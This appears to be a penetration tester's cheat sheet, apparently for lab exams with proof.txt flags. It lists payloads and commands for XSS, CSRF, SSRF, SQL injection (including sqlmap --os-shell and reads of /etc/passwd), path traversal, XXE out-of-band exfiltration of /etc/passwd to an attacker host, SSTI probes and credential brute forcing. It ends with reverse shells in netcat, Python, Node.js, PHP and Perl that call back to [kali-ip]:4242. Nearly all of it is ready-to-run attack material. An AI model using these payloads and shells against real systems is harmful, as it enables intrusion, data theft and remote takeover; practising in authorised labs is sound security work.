# Testing vulnerabilities 

## Serve files from Kali
<!-- Host payload files via Python HTTP server on port 80 -->
1. Create folder `mkdir payloads`
2. Add files to folder that you want to serve to target machine 
3. `cd` to the created folder 
4. Execute command to start serving the files:
```shell
python3 -m http.server 80
```

## XSS (Cross-Site Scripting)
<!-- Inject malicious scripts into pages viewed by other users -->

### Manual
```shell
<script>fetch("http://$KALIMASCHINE/insideScript")</script>
<script src="http://$KALIMASCHINE/srcScript"></script>
<img src='x' onerror="fetch('http://$KALIMASCHINE/img')">
```

### Fuzzing
```shell
wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt --hh 0 "$IP/index.php?id=FUZZ"
wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt -d "username=FUZZ&password=test123" --hh 0 "$IP/login"
```

## CSRF (Cross-Site Request Forgery)
<!-- Trick authenticated user into submitting unintended requests -->
With XSS e.g. attacker tricks a user into submitting a request to a site where the user already has an active, authenticated session.
```shell
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to_account" value="999999">
</form>

<script>
  document.forms[0].submit();
</script>
```

## SSRF (Server‑Side Request Forgery)
<!-- Force server to make requests to internal or external resources -->
Force an application or server to request data or a resource, where a link can be set.
```shell
file:///tmp/foo.txt
file:///c:/windows/win.ini
gopher://127.0.0.1:80/_POST%20/status%20HTTP/1.1%0a
```

## SQLi (SQL Injection)
<!-- Inject SQL code into queries to manipulate the database -->

### Fuzzing GET parameter
```shell
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$IP/index.php?id=FUZZ"
```

### Fuzzing POST parameter
```shell
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$IP/index.php"
```

### Sqlmap GET parameter
```shell
sqlmap -u "$IP/index.php?id=1"
```

### Sqlmap POST parameter
Copy POST request from Burp Suite into `post.txt` file
```shell
sqlmap -r request.txt --dump --batch
```
or 
```shell
sqlmap -r request.txt --os-shell
```
use in parameter
```
'-p username' or '*' or nothing
```

### Reading and writing files

no permission user reading files
```
SELECT pg_read_files('/etc/passwd'); # postgresql
SELECT LOAD_FILE('/etc/passwd'); # mysql
```

### Error based payloads
mysql
```
 asc, extractvalue('',concat('>',(
    select group_concat(table_schema)
    from (
      select table_schema
      from information_schema.tables
      group by table_schema)
    as foo)
    )
```

The group_concat() function is unique to MySQL. Current versions of Microsoft SQL Server and PostgreSQL have a very similar STRING_AGG() function. Additionally, current versions of Oracle DB have a LISTAGG() function that is similar to the STRING_AGG() functions.

## Directory Traversal
<!-- Access files outside the web root using path sequences -->

### Fuzzing LFI default file paths
```shell
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 0 --hc 500 "$IP/index.php?id=FUZZ"
```

### Fuzzing LFI for specific files
```shell
wfuzz -c -z file,/usr/share/seclists//Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hh 0 --hc 500 "$IP:8080/view?page=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fFUZZ"
```

### Fuzzing LFI app specific files
Create two wordlists:
1. Containing paths (paths.txt):
   ../
   ../../
   etc.
2. Containing custom files related to the web technology used (files.txt): 
   application.properties
   applitcation.yml
```shell
wfuzz -w paths.txt -w files.txt --hh 0 "$IP/index.php?id=FUZZFUZ2Z"
```

## XXE (XML External Entity)
<!-- Exploit XML parsers to read files or perform SSRF -->

### Fuzzing XXE 
Wordlist to use in Burp Suite Intruder for fuzzing XXE: `/usr/share/seclists/Fuzzing/XXE-Fuzzing.txt`

### Out-of-Band Exploitation
1. Create file named xxe.dtd with content:
```xml
<!ENTITY % content SYSTEM "file:///etc/passwd">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://[kali-ip]/out?%content;'>" >
```
2. Serve file with http 
3. Insert file in payload 
```xml
<!DOCTYPE oob [
<!ENTITY % base SYSTEM "http://[kali-ip]/external.dtd"> 
%base;
%external;
%exfil;
]>
```
4. Check incoming requests 

Note that extracting file with multiple lines may not work due to encoding issues.

## SSTI (Server-side Template Injection)
<!-- Inject template expressions to execute code server-side -->

### Discover SSTI 
```plaintext
{{7*7}}
${7*7}
#{"7"*7}
{{7*'7'}}
${dir()}
<%= 7 * 7 %>
```
with
```
{{7*7}} # if 49 => twig
${7*7} # if 49 => freemarker or jinja or mako
#{"7"*7} # if <49> => pug
{{7*'7'}} # if 77777777 => jinja or mako
${dir()} # if ['__M_caller', '__M_locals', '__M_writer', 'context', 'dir', 'pageargs'] => mako
<%= 7 * 7 %> # if 49 => EJS
```

## Command Injection
<!-- Execute OS commands through vulnerable application input fields -->

### Discovery
```
ffuf -request checkout-request.txt -w list.txt
```

### Fuzzing command injection 
```shell
wfuzz -c -z file,/usr/share/payloadsallthethings/CommandInjection/Intruder/command-execution-unix.txt --sc 200 "$IP/index.php?parameter=idFUZZ"
```

### Setup reverse shell listener 
```shell
nc -nlvp 4242
```

### Reverse shell Netcat 
```shell
/bin/nc -nv [kali-ip] 4242 -e /bin/bash
```

### Reverse shell Python 
```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[kali-ip]",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Reverse shell Node.js 
```shell
echo "require('child_process').exec('nc -nv [kali-ip] 4242 -e /bin/bash')" > /var/tmp/shell.js ; node /var/tmp/shell.js
```

### Reverse shell PHP
```php
php -r '$sock=fsockopen("[kali-ip]",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[kali-ip]",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[kali-ip]",4242);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[kali-ip]",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[kali-ip]",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

### Reverse shell Perl
```shell
perl -e 'use Socket;$i="[kali-ip]";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## IDOR (Insecure Direct Object Reference)
<!-- Access unauthorized objects by guessing or enumerating IDs -->

### Static file IDOR 
```shell
wfuzz -c -z range,1-100 --hc 404 "$IP/index.php?doc=FUZZ.txt"
```

### ID based IDOR 
```shell
wfuzz -c -z range,1-100 --hc 404 "$IP/index.php?doc=FUZZ"
```

## Brute forcing
<!-- Enumerate valid credentials using wordlists and fuzzing tools -->

### Create wordlist

cewl $IP -w wordlist.txt

### Users discovery

```shell
wfuzz -c -z file,/usr/share/SecLists/Usernames/top-username-shortlist.txt --hc 404,403 "$IP/login.php?user=FUZZ"
```

### Password discovery
```shell
wfuzz -c -z file,/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt --hc 404,403 -d "username=admin&password=FUZZ" "$IP/login.php"
```

### Double FUZZ
```shell
wfuzz -c -z file,user.txt -z file,/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt --hw 404 -d "username=FUZZ&password=FUZ2Z&submit=" "$IP/login.php"
```

## Locations proof.txt
<!-- Common paths where proof.txt flag file may be located -->
/proof.txt
/var/tmp/proof.txt
/root/proof.txt
/app/proof.txt

## Hints